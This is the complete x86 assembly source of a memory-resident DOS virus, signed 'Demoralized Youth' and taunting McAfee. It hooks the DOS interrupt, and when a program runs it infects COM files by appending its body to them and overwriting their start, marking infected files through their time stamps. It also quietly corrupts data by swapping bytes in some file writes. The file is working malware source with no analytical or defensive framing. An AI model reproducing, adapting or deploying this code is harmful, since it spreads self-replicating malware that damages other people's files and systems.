_attr_  equ 0
_date_  equ 2
_time_  equ 4

fil     equ 6

        mov     ax,4245h        ;sepuku!
        int     21h
        jmp     short jump1
        db      'DY'
dy      equ $-2-100h

_size   dw      offset total-100h
_ofs    dw      offset total

db      'McAfee, geht nach Hause! Wir sind unÅberwindlich!'

jump1:
        mov     ax,3521h
        int     21h
        mov     old21[0],bx
        mov     old21[2],es

        mov     ax,cs
        dec     ax
        mov     ds,ax
        lodsb
        cmp     byte [0],'Z'
        jne     bee_bloop_blap
        cmp     word ptr [0003h],pgf
        jc      bee_bloop_blap
        sub     word ptr [0003h],pgf
        sub     word ptr [0012h],pgf
        mov     es,[0012h]
        mov     si,110h
        mov     di,si
        sub     di,10h
        mov     cx,total-100h
        rep     movsb
        push    es
        pop     ds

        cli
        mov     ax,2521h
        mov     dx,offset swansich
        int     21h
        sti

        jmp     100h

bee_bloop_blap:
        int     24h
        int     20h

st21    db 0

vier:
        mov     al,0
        iret

swansich:
        pushf
        cmp     ax,4245h
        jne     not_sepuku
        cmp     word [dy+100h],'YD'
        jne     not_sepuku
        popf
        push    bp
        mov     bp,sp
        mov     ds,[bp+4]
        pop     bp
        mov     si,word _ofs
        mov     cx,word _size
        mov     di,100h
        push    ds
        pop     es
        cld
bam:    rep     movsb
        pop     ax
        mov     ax,100h
        push    ax
        call    zero_regs
        iret

olr     dw 0,0

not_sepuku:
        cmp     ah,40h
        jne     exec
        cmp     bx,5
        jb      exec

        cmp     cx,16
        jl      exec

        call    push_all
        mov     di,dx
        add     di,cx
        dec     di
        mov     al,[di]
        mov     bl,[di-1]
        mov     [di-1],al
        mov     [di],bl
        call    pop_all
exec:
        cmp     ax,4B00h                ;exec
        jne     back

        cmp     cs:st21,0
        jne     back

        mov     cs:st21,1

        call    push_all
        xchg    si,dx
        mov     di,fil
        push    cs
        pop     es
        mov     cx,128
        cld
        rep     movsb
        call    pop_all

        popf

        call    o21

        pushf
        call    push_all

        mov     ax,3524h
        call    o21
        push    bx
        push    es

        mov     ah,25h
        push    ds
        push    cs
        pop     ds
        push    dx
        mov     dx,offset vier
        call    o21
        pop     dx
        pop     ds

        push    cs
        pop     ds
        mov     dx,fil

        mov     ax,4300h
        call    o21
        mov     cs:[_attr_],cx
        mov     ax,4301h
        xor     cx,cx
        call    o21
        jc      err1

        call    infect

        mov     ax,4301h
        mov     cx,cs:[_attr_]
        call    o21

err1:   pop     ds
        pop     dx
        mov     ax,2524h
        call    o21

        mov     cs:st21,0

        call    pop_all
        popf
        retf    2


back:   mov     cs:st21,0
        popf
jfa:    db      0EAh
old21   dw 0,0

o21:    pushf
        call    dword ptr cs:[old21]
        ret

zero_regs:
        xor     ax,ax
        xor     bx,bx
        xor     cx,cx
        xor     dx,dx
        xor     si,si
        xor     di,di
        ret

jmp_to  dw 0

push_all:
        pop     cs:[jmp_to]
        push    bp
        push    ds
        push    es
        push    di
        push    si
        push    dx
        push    cx
        push    bx
        push    ax
        jmp     cs:[jmp_to]

pop_all:
        pop     cs:[jmp_to]
        pop     ax
        pop     bx
        pop     cx
        pop     dx
        pop     si
        pop     di
        pop     es
        pop     ds
        pop     bp
        jmp     cs:[jmp_to]



;|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
;                               infection routine
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
infect:
        pushf
        call    push_all

        mov     ax,3D02h
        call    o21
        jnc     open

i_back:
        call    pop_all
        popf
        ret

open:
        xchg    bx,ax

        push    cs
        pop     ds
        push    cs
        pop     es

        mov     ax,5700h
        call    o21
        mov     [_date_],dx
        mov     [_time_],cx

        mov     ah,3Fh
        mov     cx,offset total-100h
        mov     dx,offset total
        call    o21
        jnc     read1
jcls1:  jmp     close

read1:  cmp     ax,cx
        jne     jcls1

        cmp     word ptr [offset total],'ZM'
        je      jcls1
        cmp     byte ptr [offset total],'Z'
        je      jcls1

        cmp     word ptr [offset total+dy],'YD'
        je      jcls1

        mov     ax,4202h
        xor     cx,cx
        xor     dx,dx
        call    o21
        jc      jcls1

        cmp     dx,0
        jne     jcls1
        cmp     ah,0F1h
        ja      jcls1

        add     ax,100h
        mov     _ofs,ax

        mov     ah,40h
        mov     dx,offset total
        mov     cx,offset total-100h
        call    o21

        jc      jcls1
        cmp     ax,cx
        jne     jcls1

        mov     ax,4200h
        xor     cx,cx
        xor     dx,dx
        call    o21

        mov     ah,40h
        mov     cx,offset total-100h
        mov     dx,100h
        call    o21

        and     byte [_time_],255-31
        or      byte [_time_],29
close:
        mov     ax,5701h
        mov     cx,[_time_]
        mov     dx,[_date_]
        call    o21

        mov     ah,3Eh
        call    o21
jcls2:  jmp     i_back

db 'Demoralized Youth vous a eu'

total:
pgf     equ $/16*2
db 'Õ '




